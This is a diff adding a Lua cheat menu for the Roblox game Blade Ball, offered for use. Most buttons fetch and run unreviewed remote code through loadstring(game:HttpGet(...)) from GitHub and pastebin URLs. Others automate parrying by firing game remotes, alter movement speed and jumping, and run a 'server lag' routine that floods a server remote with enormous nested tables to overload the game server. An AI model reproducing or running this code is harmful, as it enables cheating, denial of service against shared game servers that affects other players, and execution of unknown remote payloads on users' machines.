@@ -1,0 +1,295 @@
+wait(1.2)
+
+game.StarterGui:SetCore("SendNotification", {
+
+Title = "Welcome"; -- the title (ofc)
+
+Text = "Script Made By SumitScripts"; -- what the text says (ofc)
+
+Icon = ""; -- the image if u want.
+
+Duration = 5; -- how long the notification should in secounds
+
+})
+
+
+local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/hoho_lib.lua", true))()
+local win = lib:Window("Script Made by SumitScripts","Blade Ball (OP)",Color3.new(0.333333, 0.666667, 1))
+local tab = win:Tab("Main")
+local label = tab:Label("Label", properties) --properties: {["Visible"] = flase}
+label:NewLabel("OP Win Every Game easily", properties)
+
+tab:Line()
+tab:Button("Auto OP Parry", function()
+getgenv().config = getgenv().config or {
+    hit_time = 0.5, -- // recommended 0.25 to 0.75 \ --
+ 
+    mode = 'Always', -- // Hold , Toggle , Always \ --
+    deflect_type = 'Remote', -- // Key Press , Remote \ --
+    notifications = true,
+    keybind = Enum.KeyCode.V
+}
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Parry%20V4.0.0",true))()
+	print("clicked")
+end)
+
+tab:Line()
+tab:Button("Hold to Parry", function()
+getgenv().SpamSpeed = 1
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Spam",true))()
+	print("clicked")
+end)
+
+tab:Line()
+tab:Button("Auto Clicker", function()
+local gui, frame, button = Instance.new("ScreenGui", game.CoreGui), Instance.new("Frame"), Instance.new("TextButton")
+gui.ResetOnSpawn = false
+frame.Size, frame.Position, frame.BackgroundColor3, frame.BorderSizePixel, frame.Active, frame.Draggable, frame.Parent = UDim2.new(0, 150, 0, 75), UDim2.new(0, 10, 0, 10), Color3.new(0, 0, 0), 0, true, true, gui
+button.Text, button.Size, button.Position, button.BackgroundColor3, button.BorderColor3, button.BorderSizePixel, button.Font, button.TextColor3, button.TextSize, button.Parent = "Manual spam", UDim2.new(1, -20, 1, -20), UDim2.new(0, 10, 0, 10), Color3.new(0, 0, 0), Color3.new(), 2, Enum.Font.SourceSans, Color3.new(1, 1, 1), 16, frame
+
+local activated = false
+
+local function toggle()
+    activated, button.Text = not activated, activated and "Off" or "On"
+    
+    while activated do
+        local args = {1.5, CFrame.new(-254.29, 112.14, -119.27) * CFrame.Angles(-2.03, 0.57, 2.31), {["2617721424"] = Vector3.new(-273.40, -724.80, -20.92)}, {910, 154}}
+        game:GetService("ReplicatedStorage").Remotes.ParryAttempt:FireServer(unpack(args))
+        game:GetService("RunService").Heartbeat:Wait()
+        button.BorderColor3 = Color3.new(math.random(), math.random(), math.random())
+    end
+end
+
+local function showNotification()
+    game.StarterGui:SetCore("SendNotification", {Title = "Manual Spam", Text = "Made By SumitScripts", Duration = 5})
+end
+
+button.MouseButton1Click:Connect(function()
+    toggle()
+    showNotification()
+end)
+	print("clicked")
+end)
+
+tab:Line()
+tab:Button("Auto Fram", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kmmwhocare/Crazzy-Hub/main/Blade%20Ball"))()
+	print("clicked")
+end)
+
+tab:Line()
+tab:Button("unlock abilities", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/hV0p40Fv"))()
+	print("clicked")
+end)
+
+tab:Line()
+tab:Button("Blade ball OP Hub V2", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/datshort1/datmodhub/main/Main"))()
+	print("clicked")
+end)
+
+local tab = win:Tab("Movement")
+local label = tab:Label("Label", properties) --properties: {["Visible"] = flase}
+label:NewLabel("OP SPRED", properties)
+
+tab:Line()
+tab:Button("Speed", function()
+-- Variables
+local speedValue = 16 -- Default speed value
+
+-- Create GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "JN HH Gaming"
+gui.Parent = game.Players.LocalPlayer.PlayerGui
+
+local frame = Instance.new("Frame")
+frame.Name = "SpeedFrame"
+frame.Size = UDim2.new(0, 200, 0, 100)
+frame.Position = UDim2.new(0, 10, 0, 10)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.BackgroundTransparency = 0.5
+frame.Parent = gui
+
+local speedLabel = Instance.new("TextLabel")
+speedLabel.Name = "SpeedLabel"
+speedLabel.Size = UDim2.new(0, 180, 0, 30)
+speedLabel.Position = UDim2.new(0, 10, 0, 10)
+speedLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+speedLabel.TextColor3 = Color3.new(1, 1, 1)
+speedLabel.TextSize = 18
+speedLabel.Text = "Speed: " .. speedValue
+speedLabel.Parent = frame
+
+local decreaseButton = Instance.new("TextButton")
+decreaseButton.Name = "DecreaseButton"
+decreaseButton.Size = UDim2.new(0, 50, 0, 30)
+decreaseButton.Position = UDim2.new(0, 10, 0, 50)
+decreaseButton.BackgroundColor3 = Color3.new(0, 1, 0)
+decreaseButton.TextColor3 = Color3.new(1, 1, 1)
+decreaseButton.TextSize = 14
+decreaseButton.Text = "-"
+decreaseButton.Parent = frame
+
+local increaseButton = Instance.new("TextButton")
+increaseButton.Name = "IncreaseButton"
+increaseButton.Size = UDim2.new(0, 50, 0, 30)
+increaseButton.Position = UDim2.new(0, 140, 0, 50)
+increaseButton.BackgroundColor3 = Color3.new(0, 1, 0)
+increaseButton.TextColor3 = Color3.new(1, 1, 1)
+increaseButton.TextSize = 14
+increaseButton.Text = "+"
+increaseButton.Parent = frame
+
+-- Functions
+local function updateSpeedLabel()
+    speedLabel.Text = "Speed: " .. speedValue
+end
+
+local function decreaseSpeed()
+    if speedValue > 1 then
+        speedValue = speedValue - 1
+        updateSpeedLabel()
+    end
+end
+
+local function increaseSpeed()
+    speedValue = speedValue + 1
+    updateSpeedLabel()
+end
+
+local function onDecreaseButtonClicked()
+    decreaseSpeed()
+end
+
+local function onIncreaseButtonClicked()
+    increaseSpeed()
+end
+
+-- Event connections
+decreaseButton.MouseButton1Click:Connect(onDecreaseButtonClicked)
+increaseButton.MouseButton1Click:Connect(onIncreaseButtonClicked)
+
+-- Main loop
+while true do
+    -- Modify the speed of the character (you need to replace this with the appropriate code for your specific game)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = speedValue
+    wait(0.1) -- Adjust the wait time as desired
+end
+print("clicked")
+end)
+
+tab:Line()
+tab:Button("infjump", function()
+--script made by Youtube: MrGabbe.   Discord: Mr_G_Curry #6982
+local infjmp = true
+game:GetService("UserInputService").jumpRequest:Connect(function()
+    if infjmp then
+        game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass"Humanoid":ChangeState("Jumping")
+    end
+end)
+	print("clicked")
+end)
+
+tab:Line()
+tab:Button("fly v3", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+	print("clicked")
+end)
+
+tab:Line()
+tab:Button("fps booster", function()
+-- Made by RIP#6666
+_G.Settings = {
+    Players = {
+        ["Ignore Me"] = true, -- Ignore your Character
+        ["Ignore Others"] = true -- Ignore other Characters
+    },
+    Meshes = {
+        Destroy = false, -- Destroy Meshes
+        LowDetail = true -- Low detail meshes (NOT SURE IT DOES ANYTHING)
+    },
+    Images = {
+        Invisible = true, -- Invisible Images
+        LowDetail = false, -- Low detail images (NOT SURE IT DOES ANYTHING)
+        Destroy = false, -- Destroy Images
+    },
+    ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
+    ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
+    ["No Explosions"] = true, -- Makes Explosion's invisible
+    ["No Clothes"] = true, -- Removes Clothing from the game
+    ["Low Water Graphics"] = true, -- Removes Water Quality
+    ["No Shadows"] = true, -- Remove Shadows
+    ["Low Rendering"] = true, -- Lower Rendering
+    ["Low Quality Parts"] = true -- Lower quality parts
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
+print("clicked")
+end)
+
+local tab = win:Tab("Mics")
+local label = tab:Label("Label", properties) --properties: {["Visible"] = flase}
+label:NewLabel("More Script Maybe Support your win", properties)
+
+tab:Line()
+tab:Button("server lag v2", function()
+local char = game:GetService('Players').LocalPlayer.Character or nil
+if char then
+char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
+task.wait(0.5)
+char.HumanoidRootPart.Anchored = true
+end
+while wait(1.5) do --// don't change it's the best
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+local function getmaxvalue(val)
+   local mainvalueifonetable = 499999
+   if type(val) ~= "number" then
+       return nil
+   end
+   local calculateperfectval = (mainvalueifonetable/(val+2))
+   return calculateperfectval
+end
+ 
+local function bomb(tableincrease, tries)
+local maintable = {}
+local spammedtable = {}
+ 
+table.insert(spammedtable, {})
+z = spammedtable[1]
+ 
+for i = 1, tableincrease do
+    local tableins = {}
+    table.insert(z, tableins)
+    z = tableins
+end
+ 
+local calculatemax = getmaxvalue(tableincrease)
+local maximum
+ 
+if calculatemax then
+     maximum = calculatemax
+     else
+     maximum = 999999
+end
+ 
+for i = 1, maximum do
+     table.insert(maintable, spammedtable)
+end
+ 
+for i = 1, tries do
+     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+end
+end
+ 
+bomb(289, 5) --// change values if client crashes
+end
+	print("clicked")
+end)
+
+tab:Line()
+tab:Button("infinity Yield", function()
+--Press ; to type in a command
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+	print("clicked")
+end)
